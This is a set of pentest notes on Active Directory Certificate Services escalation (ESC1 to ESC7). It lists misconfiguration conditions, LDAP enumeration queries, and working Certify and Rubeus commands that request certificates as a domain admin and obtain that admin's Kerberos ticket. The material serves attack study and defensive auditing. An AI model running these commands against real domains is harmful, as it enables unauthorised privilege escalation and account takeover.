## ESC1 - Misconfigured Certificate Templates

There is a certain set of settings that make certificate templates vulnerable, ex: low priv user to DA.

	* The enterpricse CA grants low-priv users enrollment rights
	* Manager approval is disabled
	* No authorized signatures are required
	* An overly permissive certificate template security descriptor grants certificate enrollment rights to low-priv users
	* The certificate template defines EKUs that enable authentication
	* The ceritificate template allows requesters to specify a SAN in the CSR

Certify can be used to find vulnerable templates.
```
# find vuln templates
certify.exe find /vulnerable


#request a certificate
certify.exe request /ca:domain\dcNAME /template:templatename /altname:localadmin(name of DA)

# Rubeus can then be used to request a TGT as the DA user
Rubeus.exe asktgt /user:localadmin /certificate:localadmin.pfx /password:Password123! /ptt
```

The following LDAP query can be used to enumerate certificate templates that do not require approval/signatures and that have a client auth EKU

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))
```


## ESC2 - Misconfigured Certificate Templates

This is a variation of ESC1, this works under the following conditions.

	* Enterprise CA grants low-priv users enrollment rights
	* Manager approval is disabled
	* No authorized signatures are required
	* An overly permissive certificate template security descriptor grants certificate enrollment rights to low-priv users
	* Certificate template defined the Any Purpose EKU or no EKU

The following LDAP query can be used to find certificate templates with these conditions.

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```



## ESC3 - Misconfigured Enrollment Agent Templates

Similar to 1 and 2 but abuses a different EKU and requires an additional step. The certificate request agent EKU (OID 1.3.6.1.4.1.311.20.2.1) allows a user to enroll for a certificate on behalf of another user. This requires a CA to have at least two templates matching the following conditions:

1. A template allows a low-priv user to enroll in an enrollment agent certificate
	* Enterprise CA grants low-priv users enrollment rights
	* Manager approval is disabled
	* No authorized signatures are required
	* An overly permissive certificate template security descriptor grants certificate enrollment rights to low-priv users
	* Certificate template defines the certificate request agent EKU


2. Another template permits a low-priv user to use the enrollment agent certificate to request a certificate on behalf of another user, and the template defines an EKU that allows for domain authentication
	* Enterprise CA grants low-priv users enrollment rights
	* Manager approval is disabled
	* Template schema vertion 1 or is greater than 2 and specifies an application policy issuance requiring the certificate request agent EKU
	* The certificate template defines an EKU that allows for domain authentication.
	* Enrollment agent restrictions are not implemented on the CA

certify can be used to abuse this
```
#request the enrollment agent certificate
certify.exe request /ca:domain\dcNAME /template:templateNAME


# certify can be used to issue a certificate request on behalf of a user
certify.exe /ca:domain\dcNAME /template:User /onbehalfof:domain\admin
/enrollcert:enrollmentagentcert.pfx /enrollcertpw:asdf


# Rubeus can be used from here
Rubeus.exe asktgt /user:domain\admin /certificate:adminfromenrollmentagent.pfx /password:asdf
```


## ESC4 - Vulnerable Certificate Access control

A template would be considerd vulnerable at the access control level if an ACE exists that allow unintended, or unprivileged AD principals to edit sensitive security settings in the template. The specific rights we are concerned with here is "Full control" and "Write". The full rights are: Owner, FullControl, WriteOwner, WriteDacl, WriteProperty


Certifys find command can enumeratea these ACEs and this is also being worked into BH




## ESC5 - Vulnerable PKI Access Control

The ACL based relationship within AD can compromise the entire AD CS implementation.

	* The CA server's computer object
	* the CA server's RPC/DCOM
	* Any descendant AD object or container in the container CN=Public Key Services,CN=Services,CN=Configuration,DC=<COMPANY>,DC=<COM> (e.g., the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, the Enrollment Services Container, etc.)



## ESC6 - EDITF_ATTRIBUTESUBJECTNAME2

This escalation method involved the EDITF_ATTRIBUTESUBJECTNAME2 attribute. From the specterops paper, "If this flag is set on the CA, any request (including when the subject is built from Active Directory®) can have user defined values in the subject alternative name."

Certutil can be used to check is this setting is enabled:
```
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"


# this reg query can also be used
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags


# Certifys find will also search this on every CA it finds
certify.exe find
```

This can be abused with the /altname option
```
certify.exe request /ca:domain\dcNAME /template:User /altname:admin
```

## ESC7 - Vulnerable Certificate Authority Access Control 

A CA has a set of permissions that secure its actions. These can be enumerated through the GUI, certsrv.msc. Right click a CA and select properties > security. PSPKI module can be used in powershell 

```powershell
# The two main rights we are looking for is ManageCA and ManageCertificates

Get-CertificationAuthority -ComputerName dc.name | Get-CertificationAuthorityAcl | select -expand Access
```


